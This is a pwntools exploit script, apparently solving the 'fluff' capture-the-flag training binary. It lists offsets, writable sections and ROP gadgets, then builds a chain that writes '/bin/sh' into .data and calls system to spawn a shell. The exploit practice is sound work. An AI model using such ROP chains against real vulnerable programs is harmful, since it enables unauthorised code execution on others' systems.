#!/usr/bin/env python
"""
rsp found at offset: 40
rbp found at offset: 32

Writable sections (readelf --sections --wide fluff):
    [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al
    ...
    [19] .init_array       INIT_ARRAY      0000000000600e10 000e10 000008 00  WA  0   0  8
    [20] .fini_array       FINI_ARRAY      0000000000600e18 000e18 000008 00  WA  0   0  8
    [21] .jcr              PROGBITS        0000000000600e20 000e20 000008 00  WA  0   0  8
    [22] .dynamic          DYNAMIC         0000000000600e28 000e28 0001d0 10  WA  6   0  8
    [23] .got              PROGBITS        0000000000600ff8 000ff8 000008 08  WA  0   0  8
    [24] .got.plt          PROGBITS        0000000000601000 001000 000050 08  WA  0   0  8
    [25] .data             PROGBITS        0000000000601050 001050 000010 00  WA  0   0  8
    [26] .bss              NOBITS          0000000000601060 001060 000030 00  WA  0   0 32


Gadgets being used are:
    
    Found with objdump 
        400810: e8 cb fd ff ff        call   4005e0 <system@plt>

    Found with ropper (ropper -f fluff -a x86_64)
        0x00000000004008c3: pop rdi; ret;
        0x000000000040084d: pop rdi; mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
        0x0000000000400853: pop r12; xor byte ptr [r10], r12b; ret; 
        0x00000000004008bc: pop r12; pop r13; pop r14; pop r15; ret; 
        0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret; 

        # Moving value into r11 (put xor of required value into r12)
        0x0000000000400832: pop r12; mov r13d, 0x604060; ret; 
        0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret;

        # To move value into r10, we first place it into r11 and then 
        0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret; 


"""

from pwn import *




writable_addr = p64(0x0000601050)  # .data
s = "/bin/sh\x00"

payload = "A"*40

# xor r11, r11 to zero it out then pops null into r14
payload += p64(0x400822) + p64(0)
# Pop r12, then xor r11,r12 and pop r12 again
payload += p64(0x00000400832) + writable_addr + p64(0x40082f) + p64(0)
# Xchg r11 and r10, then pops r15
payload += p64(0x400840) + p64(0)

# Writable address should be in r10, now need to system string into r11 by repeating process above

# xor r11, r11 to zero it out then pops null into r14
payload += p64(0x400822) + p64(0x42)
# Pop r12, then xor r11,r12 and pop r12 again
payload += p64(0x00000400832) + s + p64(0x40082f) + p64(0)

# Both strings ready, it's time to do the mov

# this pops rdi, then mov [r10],r11 (which we need), but then does 2 pops and a xor
payload += p64(0x000000000040084d) + writable_addr + p64(0) + p64(0)
# System
payload += p64(0x400810)

p = process('./fluff')
# p = gdb.debug('./fluff', 'break *0x000000000040084d')
p.recvuntil(">")
p.sendline(payload)
p.interactive()